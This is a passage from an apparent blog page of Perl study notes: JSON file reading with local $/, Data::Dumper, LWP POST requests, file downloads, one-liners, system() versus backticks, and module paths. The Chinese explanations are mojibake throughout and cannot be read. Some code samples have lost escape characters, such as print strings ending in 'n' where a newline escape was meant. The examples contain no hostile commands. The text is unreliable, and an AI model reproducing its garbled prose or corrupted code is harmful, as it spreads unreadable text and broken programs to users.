<span class="hljs-string">&quot;hexo server&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>åˆ™ <code>$data-&gt;&#123;&quot;scripts&quot;&#125;</code> æ˜¯ä¸€ä¸ª HASH reference.</p><h1 id="æŸ¥æ‰¾æ•°ç»„ä¸­å«æœ‰æŸä¸ªå…ƒç´ "><a href="#æŸ¥æ‰¾æ•°ç»„ä¸­å«æœ‰æŸä¸ªå…ƒç´ " class="headerlink" title="æŸ¥æ‰¾æ•°ç»„ä¸­å«æœ‰æŸä¸ªå…ƒç´ "></a>æŸ¥æ‰¾æ•°ç»„ä¸­å«æœ‰æŸä¸ªå…ƒç´ </h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># $value can be any regex. be safe</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-keyword">grep</span>( <span class="hljs-regexp">/^$value$/</span>, @array ) ) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;found it&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="å‘-JSON-æ–‡ä»¶ä¸­æ·»åŠ å†…å®¹"><a href="#å‘-JSON-æ–‡ä»¶ä¸­æ·»åŠ å†…å®¹" class="headerlink" title="å‘ JSON æ–‡ä»¶ä¸­æ·»åŠ å†…å®¹"></a>å‘ JSON æ–‡ä»¶ä¸­æ·»åŠ å†…å®¹</h1><h1 id="Data-Dumper-æ¨¡å—ä½¿ç”¨å’Œä½œç”¨"><a href="#Data-Dumper-æ¨¡å—ä½¿ç”¨å’Œä½œç”¨" class="headerlink" title="Data::Dumper æ¨¡å—ä½¿ç”¨å’Œä½œç”¨"></a>Data::Dumper æ¨¡å—ä½¿ç”¨å’Œä½œç”¨</h1><p><code>perldoc</code> ä¸­çš„ç®€ä»‹æ˜¯å°† Perl çš„æ•°æ®ç»“æ„ (å¯ä»¥ç»™ a list of scalars or reference variables) å­—ç¬¦ä¸²åŒ–, ä½†å¹¶ä¸æ˜¯è¾“å‡ºå†…å®¹, è€Œæ˜¯ç»“åˆ <code>print</code>, <code>eval</code> ä½¿ç”¨, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dumper;<br><br><span class="hljs-keyword">print</span> Dumper($foo, $bar);<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹:</p><p><img src="/../img/output_of_perl_mod_Data_Dumper.png"></p><h1 id="å…³äº-open-å‡½æ•°å’Œ-file-handle-ä»¥åŠ-å˜é‡"><a href="#å…³äº-open-å‡½æ•°å’Œ-file-handle-ä»¥åŠ-å˜é‡" class="headerlink" title="å…³äº open å‡½æ•°å’Œ file handle, ä»¥åŠ $/ å˜é‡"></a>å…³äº open å‡½æ•°å’Œ file handle, ä»¥åŠ <code>$/</code> å˜é‡</h1><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, $filename;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>$fh</code> è¿™ä¸ªå˜é‡ä¸­å¹¶ä¸æ˜¯ä¿å­˜æ–‡ä»¶å†…å®¹, è·å–æ–‡ä»¶å†…å®¹å¯ä»¥ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;$fh&gt;<br></code></pre></td></tr></table></figure><p><code>$/</code> è¿™ä¸ªå˜é‡å«åš Input Record Separator, æ˜¯ç”¨æ¥, â€œinfluence Perlâ€™s idea of what a â€˜lineâ€™ isâ€.</p><p>ä¸€èˆ¬ç”¨ <code>lines()</code> æˆ– <code>&lt;&gt;</code> è¯»å–æ–‡ä»¶ä¹‹å‰, éƒ½å¯ä»¥è®¾ç½® <code>$/</code>. ç”±äº <code>$/</code> æ˜¯ global çš„å˜é‡, æ‰€ä»¥ä¸èƒ½å†™æˆ <code>my $/</code>, è€Œä½¿ç”¨ <code>local $/</code> æ¥ä¿®æ”¹å…¶å€¼.</p><p>æŠ€å·§:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $json = JSON-&gt;new;<br><span class="hljs-keyword">my</span> $filename = <span class="hljs-string">&#x27;package.json&#x27;</span>;<br><br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh_json, <span class="hljs-string">&quot;&lt;:encoding(UTF-8)&quot;</span>, $filename;<br><span class="hljs-keyword">local</span> $/;<br><span class="hljs-keyword">my</span> $text = &lt;$fh_json&gt;;<br><span class="hljs-keyword">print</span> $text;<br><br><span class="hljs-keyword">close</span> $fh_json;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>$/</code> å¾ˆå…³é”®, è¿™é‡Œç›¸å½“äºæ˜¯å°†å…¶è®¾ç½®ä¸º <code>undef</code>, è¿™æ · <code>&lt;&gt;</code> ä¼šè¯»å–æ•´ä¸ªæ–‡ä»¶çš„å†…å®¹å¹¶è¿”å›ç»™ <code>$text</code>, å¦‚æœè¿™é‡Œæ²¡æœ‰ <code>local $/</code><br><code>$/</code> é»˜è®¤çš„å€¼å°±æ˜¯ <code>\n</code>, <code>&lt;&gt;</code> æ“ä½œç¬¦å°±åªèƒ½è¯»å–ä¸€è¡Œæ–‡ä»¶å†…å®¹, åœ¨è¿™ä¸ª <code>json</code> æ–‡ä»¶ä¸­å°±æ˜¯ <code>&#123;</code>, ä¼šæŠ¥é”™.</p><h1 id="ç»„ç»‡ä¸€æ®µä»£ç "><a href="#ç»„ç»‡ä¸€æ®µä»£ç " class="headerlink" title="ç»„ç»‡ä¸€æ®µä»£ç "></a>ç»„ç»‡ä¸€æ®µä»£ç </h1><p>çœ‹åˆ°è¿™ç§å†™æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $json_text = <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">open</span>(<span class="hljs-keyword">my</span> $json_fh, <span class="hljs-string">&quot;&lt;:encoding(UTF-8)&quot;</span>, $filename)<br>        <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Can&#x27;t open \$filename\&quot;: $!\n&quot;</span>);<br>        <span class="hljs-keyword">local</span> $/;<br>        &lt;$json_fh&gt;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æŠŠä¸è·å– <code>$json_text</code> å˜é‡å€¼çš„ä»£ç ç»„ç»‡åœ¨äº†ä¸€ä¸ªä»£ç å—ä¸­, æ„Ÿè§‰æ¯”è¾ƒæ–¹ä¾¿é˜…è¯».</p><h1 id="Exporter-æ¨¡å—çš„å¯¼å…¥æ–¹æ³•"><a href="#Exporter-æ¨¡å—çš„å¯¼å…¥æ–¹æ³•" class="headerlink" title="Exporter æ¨¡å—çš„å¯¼å…¥æ–¹æ³•"></a>Exporter æ¨¡å—çš„å¯¼å…¥æ–¹æ³•</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> vars <span class="hljs-string">qw( @ISA )</span>;<br><br><span class="hljs-keyword">require</span> Exporter;<br><br>@ISA = <span class="hljs-string">qw( Exporter )</span>;<br></code></pre></td></tr></table></figure><h1 id="å…³äºå‡½æ•°å¤–ç”¨-my-å£°æ˜çš„å˜é‡"><a href="#å…³äºå‡½æ•°å¤–ç”¨-my-å£°æ˜çš„å˜é‡" class="headerlink" title="å…³äºå‡½æ•°å¤–ç”¨ my å£°æ˜çš„å˜é‡"></a>å…³äºå‡½æ•°å¤–ç”¨ my å£°æ˜çš„å˜é‡</h1><p>å…¶å¯¹äºå‡½æ•°è€Œè¨€æ˜¯å…¨å±€å˜é‡, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $file_name = <span class="hljs-string">&#x27;test.json&#x27;</span>;<br><br>Test();<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $json_text = <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $json_fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, $file_name;<br>        <span class="hljs-keyword">local</span> $/;<br>        &lt;$json_fh&gt;<br>    &#125;;<br>    <span class="hljs-keyword">print</span> $json_text;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Test()</code> å‡½æ•°å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>$file_name</code> å˜é‡.</p><h1 id="è·å–ä¸€ä¸ªåµŒå¥—-hash-çš„æ‰€æœ‰-value"><a href="#è·å–ä¸€ä¸ªåµŒå¥—-hash-çš„æ‰€æœ‰-value" class="headerlink" title="è·å–ä¸€ä¸ªåµŒå¥— hash çš„æ‰€æœ‰ value"></a>è·å–ä¸€ä¸ªåµŒå¥— hash çš„æ‰€æœ‰ value</h1><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_1 = &#123;<br>    <span class="hljs-string">&quot;ref_2&quot;</span> =&gt; &#123;<br>        <span class="hljs-string">&quot;test1&quot;</span> =&gt; <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;test2&quot;</span> =&gt; <span class="hljs-number">2</span>,<br>        <span class="hljs-string">&quot;test3&quot;</span> =&gt; <span class="hljs-number">3</span>,<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$_ \n&quot;</span> <span class="hljs-keyword">foreach</span> <span class="hljs-keyword">values</span> %&#123;$ref_1-&gt;&#123;<span class="hljs-string">&quot;ref_2&quot;</span>&#125;&#125;;<br></code></pre></td></tr></table></figure><h1 id="åˆå§‹åŒ–åˆ—è¡¨å’Œå“ˆå¸Œ"><a href="#åˆå§‹åŒ–åˆ—è¡¨å’Œå“ˆå¸Œ" class="headerlink" title="åˆå§‹åŒ–åˆ—è¡¨å’Œå“ˆå¸Œ"></a>åˆå§‹åŒ–åˆ—è¡¨å’Œå“ˆå¸Œ</h1><p>éƒ½æ˜¯ç”¨ <code>()</code>.</p><h1 id="Devel-Peek-æ¨¡å—"><a href="#Devel-Peek-æ¨¡å—" class="headerlink" title="Devel::Peek æ¨¡å—"></a><code>Devel::Peek</code> æ¨¡å—</h1><p>å¯ä»¥å¾—åˆ°æ›´å¤šå…³äº reference çš„å†…éƒ¨ä¿¡æ¯.</p><h1 id="åˆ©ç”¨-LWP-æ¨¡å—å‘é€-request"><a href="#åˆ©ç”¨-LWP-æ¨¡å—å‘é€-request" class="headerlink" title="åˆ©ç”¨ LWP æ¨¡å—å‘é€ request"></a>åˆ©ç”¨ <code>LWP</code> æ¨¡å—å‘é€ request</h1><p>å¦‚ <code>POST</code> è¯·æ±‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> LWP::UserAgent;<br><br><span class="hljs-keyword">my</span> $ua = LWP::UserAgent-&gt;new;<br><br><span class="hljs-keyword">my</span> $server_endpoint = <span class="hljs-string">&quot;http://192.168.1.1:8000/service&quot;</span>;<br><br><span class="hljs-comment"># set custom HTTP request header fields</span><br><span class="hljs-keyword">my</span> $req = HTTP::Request-&gt;new(<span class="hljs-string">POST =&gt;</span> $server_endpoint);<br>$req-&gt;header(<span class="hljs-string">&#x27;content-type&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>$req-&gt;header(<span class="hljs-string">&#x27;x-auth-token&#x27;</span> =&gt; <span class="hljs-string">&#x27;kfksj48sdfj4jd9d&#x27;</span>);<br><br><span class="hljs-comment"># add POST data to HTTP request body</span><br><span class="hljs-keyword">my</span> $post_data = <span class="hljs-string">&#x27;&#123; &quot;name&quot;: &quot;Dan&quot;, &quot;address&quot;: &quot;NY&quot; &#125;&#x27;</span>;<br>$req-&gt;content($post_data);<br><br><span class="hljs-keyword">my</span> $resp = $ua-&gt;request($req);<br><span class="hljs-keyword">if</span> ($resp-&gt;is_success) &#123;<br>    <span class="hljs-keyword">my</span> $message = $resp-&gt;decoded_content;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Received reply: $messagen&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;HTTP POST error code: &quot;</span>, $resp-&gt;code, <span class="hljs-string">&quot;n&quot;</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;HTTP POST error message: &quot;</span>, $resp-&gt;message, <span class="hljs-string">&quot;n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†ä¸¤ä¸ªæ¨¡å— <code>LWP::UserAgent</code> å’Œ <code>HTTP::Request</code>.</p><h1 id="ç‰ˆæœ¬åŒ…æ†ç»‘"><a href="#ç‰ˆæœ¬åŒ…æ†ç»‘" class="headerlink" title="ç‰ˆæœ¬åŒ…æ†ç»‘"></a>ç‰ˆæœ¬åŒ…æ†ç»‘</h1><p><a href="https://3g.163.com/dy/article/H8USHHJU0511CUMI.html?spss=adap_pc">å‚è€ƒ</a></p><p>Perl 5.36.0 å¼•å…¥äº†ç‰ˆæœ¬åŒ…æ†ç»‘ (Version bundles) åŠŸèƒ½, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">36</span>;<br></code></pre></td></tr></table></figure><p>ç›¸å½“äºä»¥å‰çš„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">require</span> v5.<span class="hljs-number">36</span>;<br><span class="hljs-keyword">use</span> strict;<br><span class="hljs-keyword">use</span> warnings;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;say&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;state&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;current_sub&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;fc&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;lexical_subs&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;signatures&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;isa&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;bareword_filehandles&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;bitwise&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;evalbytes&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;postderef_qq&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;unicode_eval&#x27;</span>;<br><span class="hljs-keyword">use</span> feature <span class="hljs-string">&#x27;unicode_strings&#x27;</span>;<br><span class="hljs-keyword">no</span> feature <span class="hljs-string">&#x27;indirect&#x27;</span>;<br><span class="hljs-keyword">no</span> feature <span class="hljs-string">&#x27;multidimensional&#x27;</span>;<br></code></pre></td></tr></table></figure><h1 id="ä»ç½‘é¡µä¸‹è½½æ–‡ä»¶"><a href="#ä»ç½‘é¡µä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä»ç½‘é¡µä¸‹è½½æ–‡ä»¶"></a>ä»ç½‘é¡µä¸‹è½½æ–‡ä»¶</h1><p>å¯ä»¥è°ƒç”¨ shell å‘½ä»¤å¦‚ curl å’Œ wget, ä¹Ÿå¯ä»¥ç”¨æ¨¡å—.</p><h2 id="ä½¿ç”¨-LWP-Simple"><a href="#ä½¿ç”¨-LWP-Simple" class="headerlink" title="ä½¿ç”¨ LWP::Simple"></a>ä½¿ç”¨ <code>LWP::Simple</code></h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><br><span class="hljs-keyword">use</span> strict;<br><span class="hljs-keyword">use</span> warnings;<br><br><span class="hljs-keyword">use</span> LWP::Simple;<br><br><span class="hljs-keyword">my</span> $url = <span class="hljs-string">&#x27;http://marinetraffic2.aegean.gr/ais/getkml.aspx&#x27;</span>;<br><span class="hljs-keyword">my</span> $file = <span class="hljs-string">&#x27;data.kml&#x27;</span>;<br><br>getstore($url, $file);<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-File-Fetch"><a href="#ä½¿ç”¨-File-Fetch" class="headerlink" title="ä½¿ç”¨ File::Fetch"></a>ä½¿ç”¨ <code>File::Fetch</code></h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Fetch;<br><span class="hljs-keyword">my</span> $url = <span class="hljs-string">&#x27;http://www.example.com/file.txt&#x27;</span>;<br><span class="hljs-keyword">my</span> $ff = File::Fetch-&gt;new(<span class="hljs-string">uri =&gt;</span> $url);<br><span class="hljs-keyword">my</span> $file = $ff-&gt;fetch() <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> $ff-&gt;error;<br></code></pre></td></tr></table></figure><h1 id="æ‰“å°æ–‡ä»¶çš„æŸå‡ è¡Œ"><a href="#æ‰“å°æ–‡ä»¶çš„æŸå‡ è¡Œ" class="headerlink" title="æ‰“å°æ–‡ä»¶çš„æŸå‡ è¡Œ"></a>æ‰“å°æ–‡ä»¶çš„æŸå‡ è¡Œ</h1><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -ne <span class="hljs-string">&#x27;print qq($.: $_) if 4 .. 7&#x27;</span> fileA<br></code></pre></td></tr></table></figure><p>èŒƒå›´æ“ä½œç¬¦, <code>if</code> ä¹‹åä»…ä»…ç»™å®šä¸€ä¸ªæ•°å­—èŒƒå›´æ—¶, å®ƒä¼šé»˜é»˜é‚£è¡¨ç¤ºè¡Œè®¡æ•°çš„ <code>$.</code> æ¥æ¯”è¾ƒ.</p><h1 id="å‘½ä»¤è¡Œä¸­-æŸäº›ä»£ç ä¸æ”¾å…¥-n-å¼€å¯çš„å¾ªç¯"><a href="#å‘½ä»¤è¡Œä¸­-æŸäº›ä»£ç ä¸æ”¾å…¥-n-å¼€å¯çš„å¾ªç¯" class="headerlink" title="å‘½ä»¤è¡Œä¸­, æŸäº›ä»£ç ä¸æ”¾å…¥ -n å¼€å¯çš„å¾ªç¯"></a>å‘½ä»¤è¡Œä¸­, æŸäº›ä»£ç ä¸æ”¾å…¥ <code>-n</code> å¼€å¯çš„å¾ªç¯</h1><p>å¯åˆ©ç”¨ <code>BEGIN&#123;&#125;</code> å’Œ <code>END&#123;&#125;</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -nle <span class="hljs-string">&#x27;$count++ &#125; END &#123; print $count &#125;&#x27;</span> *.pl<br>$ perl -nle <span class="hljs-string">&#x27;$count++ &#125; \ </span><br><span class="hljs-string">    BEGIN &#123; print q(Counting ) . @ARGV . q( files) &#125; \ </span><br><span class="hljs-string">    END &#123; print $count &#x27;</span> *.pl<br></code></pre></td></tr></table></figure><h1 id="æ‰“å°æ•°ç»„å¼•ç”¨ä¸­çš„å…¨éƒ¨å…ƒç´ "><a href="#æ‰“å°æ•°ç»„å¼•ç”¨ä¸­çš„å…¨éƒ¨å…ƒç´ " class="headerlink" title="æ‰“å°æ•°ç»„å¼•ç”¨ä¸­çš„å…¨éƒ¨å…ƒç´ "></a>æ‰“å°æ•°ç»„å¼•ç”¨ä¸­çš„å…¨éƒ¨å…ƒç´ </h1><p>éœ€è¦æ‹¬å·: <code>@&#123;$array_ref&#125;</code>;</p><h1 id="æ­£åˆ™è¡¨è¾¾å¼ä¸­æ›¿æ¢-Unicode"><a href="#æ­£åˆ™è¡¨è¾¾å¼ä¸­æ›¿æ¢-Unicode" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ä¸­æ›¿æ¢ Unicode"></a>æ­£åˆ™è¡¨è¾¾å¼ä¸­æ›¿æ¢ Unicode</h1><p>ä½¿ç”¨ <code>\x&#123;&#125;</code> çš„è¯­æ³•, æ‹¬å·å†…æ˜¯ç ç‚¹.</p><h1 id="ä¸ä½¿ç”¨-Moose-åˆ›å»ºå¯¹è±¡çš„æ„é€ å‡½æ•°"><a href="#ä¸ä½¿ç”¨-Moose-åˆ›å»ºå¯¹è±¡çš„æ„é€ å‡½æ•°" class="headerlink" title="ä¸ä½¿ç”¨ Moose åˆ›å»ºå¯¹è±¡çš„æ„é€ å‡½æ•°"></a>ä¸ä½¿ç”¨ Moose åˆ›å»ºå¯¹è±¡çš„æ„é€ å‡½æ•°</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Test;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">new</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $value = <span class="hljs-keyword">shift</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">bless</span> \$value =&gt; $class;<br>&#125;<br><br><br><span class="hljs-keyword">package</span> main;<br><br><span class="hljs-keyword">my</span> $test_obj = Test-&gt;new(<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><h1 id="å…³äº-Perl-ä¸­çš„å¯¹è±¡"><a href="#å…³äº-Perl-ä¸­çš„å¯¹è±¡" class="headerlink" title="å…³äº Perl ä¸­çš„å¯¹è±¡"></a>å…³äº Perl ä¸­çš„å¯¹è±¡</h1><p>å¯¹è±¡ä¼¼ä¹éƒ½æ˜¯å¼•ç”¨.</p><h1 id="åŒºåˆ†-system-å’Œ-backticks-çš„ä½œç”¨"><a href="#åŒºåˆ†-system-å’Œ-backticks-çš„ä½œç”¨" class="headerlink" title="åŒºåˆ† system() å’Œ backticks çš„ä½œç”¨"></a>åŒºåˆ† <code>system()</code> å’Œ backticks çš„ä½œç”¨</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç›´æ¥è¿è¡Œç³»ç»Ÿå‘½ä»¤, ä¸ä¼šè¿”å›ç»™ Perl å˜é‡.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ls_content = <span class="hljs-string">`ls`</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è·å¾—å‘½ä»¤çš„ç»“æœ.</p><h1 id="ä½¿ç”¨è‡ªå·±çš„ä»£ç "><a href="#ä½¿ç”¨è‡ªå·±çš„ä»£ç " class="headerlink" title="ä½¿ç”¨è‡ªå·±çš„ä»£ç "></a>ä½¿ç”¨è‡ªå·±çš„ä»£ç </h1><p>ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN &#123;<br>    <span class="hljs-keyword">push</span> @INC, <span class="hljs-string">&#x27;path/to/your/code&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> lib <span class="hljs-string">&#x27;path/to/your/code&#x27;</span><br></code></pre></td></tr></table></figure><p>æˆ–æ”¹å˜ç¯å¢ƒå˜é‡ <code>PERL5LIB</code> ç­‰çš„å€¼.</p><h1 id="ä¸€ä¸ªå˜é‡çš„å‡ ç§å†™æ³•"><a href="#ä¸€ä¸ªå˜é‡çš„å‡ ç§å†™æ³•" class="headerlink" title="ä¸€ä¸ªå˜é‡çš„å‡ ç§å†™æ³•"></a>ä¸€ä¸ªå˜é‡çš„å‡ ç§å†™æ³•</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$main::var;<br>$var;<br>$::var;<br></code></pre></td></tr></table></figure><p>éƒ½ç­‰ä»·.</p><h1 id="å…³äºå¤šæ¬¡ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶å¥æŸ„"><a href="#å…³äºå¤šæ¬¡ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶å¥æŸ„" class="headerlink" title="å…³äºå¤šæ¬¡ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶å¥æŸ„"></a>å…³äºå¤šæ¬¡ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶å¥æŸ„</h1><p>åœ¨ä½¿ç”¨è¿‡ä¸€æ¬¡æ–‡ä»¶å¥æŸ„å, å…¶ä¸­çš„å†…å®¹å°±å·²ç»ä¸¢å¤±äº†, å› æ­¤åœ¨åŒä¸€ä¸ªç¨‹åºä¸­å†æ¬¡ç”¨åŒä¸€ä¸ªæ–‡ä»¶å¥æŸ„ä¸ä¼šå¾—åˆ°ç›¸åŒçš„è¾“å‡º, éœ€è¦å†æ‰“å¼€ä¸€ä¸ª.</p><h1 id="ä¸åŒ¹é…æŸæ®µæ­£åˆ™è¡¨è¾¾å¼"><a href="#ä¸åŒ¹é…æŸæ®µæ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ä¸åŒ¹é…æŸæ®µæ­£åˆ™è¡¨è¾¾å¼"></a>ä¸åŒ¹é…æŸæ®µæ­£åˆ™è¡¨è¾¾å¼</h1><p>ä½¿ç”¨ <code>!~</code> æ“ä½œç¬¦.</p><p>Perl ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ Data::Dumper æ¨¡å—æ¥æ˜¾ç¤ºå¼•ç”¨ä¸­æ‰€æœ‰çš„å±‚çº§å…³ç³»ã€‚åªéœ€è¦å°†å¼•ç”¨ä¼ é€’ç»™ Data::Dumper 